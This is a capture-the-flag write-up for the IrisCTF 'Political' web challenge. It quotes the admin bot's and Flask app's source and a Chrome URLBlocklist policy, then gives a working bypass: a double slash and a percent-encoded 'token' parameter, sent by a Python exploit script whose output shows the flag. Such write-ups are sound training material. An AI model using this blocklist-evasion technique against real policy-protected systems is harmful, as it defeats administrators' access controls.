# Political

## Description

My new enterprise policy ensures you will remain flag-free.

Link: [https://political-web.chal.irisc.tf](https://political-web.chal.irisc.tf/)
TCP: [nc political-bot.chal.irisc.tf 1337](nc political-bot.chal.irisc.tf 1337)
Source: [political.tar.gz](https://cdn.2025.irisc.tf/political.tar.gz)

> **Hint**: The admin bot replying with "timeout" does not mean the bot is malfunctioning; just that the page render timed out after the defined time limit.

By: **sera**

## Solution

![Political.png](/assets/ctf/iris/political.png)

Replies with `Nice Try.`

Port 1337 is serving bot, which seems to open given urls.
```bash
└─$ nc political-bot.chal.irisc.tf 1337

== proof-of-work: disabled ==
Please send me a URL to open.
uwu
Invalid URL (must start with https://political-web.chal.irisc.tf/).
```

Bot asks for URL and then tries to load this url, but it must be on same domain as challenge.
```js
const puppeteer = require('puppeteer');
const fs = require('fs');
const net = require('net');

const BOT_TIMEOUT = process.env.BOT_TIMEOUT || 2*1000;

const puppeter_args = {};

(async function(){
  const browser = await puppeteer.launch(puppeter_args);

  function ask_for_url(socket) {
      socket.state = 'URL';
      socket.write('Please send me a URL to open.\n');
  }

  async function load_url(socket, data) {
    let url = data.toString().trim();
    console.log(`checking url: ${url}`);
    // replace with your server as needed
    if (!url.startsWith('http://localhost:1337/') && !url.startsWith('https://localhost:1337/')) {
      socket.state = 'ERROR';
      socket.write('Invalid URL (must start with http:// or https://).\n');
      socket.destroy();
      return;
    }
    socket.state = 'LOADED';
    let cookie = JSON.parse(fs.readFileSync('/home/user/cookie'));

    const context = await browser.createBrowserContext();
    const page = await context.newPage();
    await page.setJavaScriptEnabled(false);
    await page.setCookie(cookie);
    socket.write(`Loading page ${url}.\n`);
    setTimeout(()=>{
      try {
        context.close();
        socket.write('timeout\n');
        socket.destroy();
      } catch (err) {
        console.log(`err: ${err}`);
      }
    }, BOT_TIMEOUT);
    await page.goto(url);
  }

  var server = net.createServer();
  server.listen(1338);
  console.log('listening on port 1338');

  server.on('connection', socket=>{
    socket.on('data', data=>{
      try {
        if (socket.state == 'URL') {
          load_url(socket, data);
        }
      } catch (err) {
        console.log(`err: ${err}`);
      }
    });

    try {
      ask_for_url(socket);
    } catch (err) {
      console.log(`err: ${err}`);
    }
  });
})();
```

It's using `httpOnly` cookies, so we can't steal cookies.
```json
{
  "name": "admin",
  "value": "redacted",
  "domain": "localhost:5000",
  "url": "http://localhost:5000/",
  "path": "/",
  "httpOnly": true,
  "secure": true
}
```

Docker sets up Chrome in a way where `URLBlocklist` patterns are blacklisted. [URL blocklist filter format](https://support.google.com/chrome/a/answer/9942583?hl=en)
```json
{ "URLBlocklist": ["*/giveflag", "*?token=*"] }
---
COPY policy.json /etc/opt/chrome_for_testing/policies/managed/
```

Application source code:
```python
from flask import Flask, request, send_file
import secrets

app = Flask(__name__)
FLAG = "irisctf{testflag}"
ADMIN = "redacted"

valid_tokens = {}

@app.route("/")
def index():
    return send_file("index.html")

@app.route("/giveflag")
def hello_world():
    if "token" not in request.args or "admin" not in request.cookies:
        return "Who are you?"

    token = request.args["token"]
    admin = request.cookies["admin"]
    if token not in valid_tokens or admin != ADMIN:
        return "Why are you?"

    valid_tokens[token] = True
    return "GG"

@app.route("/token")
def tok():
    token = secrets.token_hex(16)
    valid_tokens[token] = False
    return token

@app.route("/redeem", methods=["POST"])
def redeem():
    if "token" not in request.form:
        return "Give me token"

    token = request.form["token"]
    if token not in valid_tokens or valid_tokens[token] != True:
        return "Nice try."

    return FLAG
```

After some fuzzing I was able to bypass the first policy by double slashes `//giveflag`, but token param is not working as intended~

Following should have worked, but doesn't 
```
https://political-web.chal.irisc.tf//giveflag?x=y&token=TOKEN
```

And I think it's because the order is ignored and pattern is matching token. To add `token=` activates blocklist.

![Political-1.png](/assets/ctf/iris/political-1.png)

If you're on linux you can repeat the steps (`mkdir + cp policy.json`) in Docker and test policy locally.

![Political-2.png](/assets/ctf/iris/political-2.png)

For some reason URL encoding the character(s) bypassed the `token=` restriction. 

```python
from time import time
import socket
import requests

HOST, PORT = 'political-bot.chal.irisc.tf', 1337
URL = 'https://political-web.chal.irisc.tf'
PAYLOAD = '{}//giveflag?a=b&%74oken={}&x=y\n'


# Step 1: Get token
token = requests.get(f'{URL}/token').text
payload = PAYLOAD.format(URL, token)
print(token)
print(payload)

# Step 2: Make token valid
start = time()
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as io:
    io.settimeout(5)
    io.connect((HOST, PORT))
    io.sendall(payload.encode())  # Send Payload
    response = b""
    while True:
        try:  # Read all responses
            if not (chunk := io.recv(4096)): break
            response += chunk
        except socket.timeout:
            break

    print(response.decode())
end = time()
print(end - start)

# Get flag
resp = requests.post(f'{URL}/redeem', data={'token': token})
print(resp.text)
```

```powershell
➜ py .\t.py 
1d638012d95edc7deccbf331cecda974
https://political-web.chal.irisc.tf//giveflag?a=b&%74oken=1d638012d95edc7deccbf331cecda974&x=y

== proof-of-work: disabled ==
Please send me a URL to open.
Loading page https://political-web.chal.irisc.tf//giveflag?a=b&%74oken=1d638012d95edc7deccbf331cecda974&x=y.
timeout

2.8698556423187256
irisctf{flag_blocked_by_admin}
```

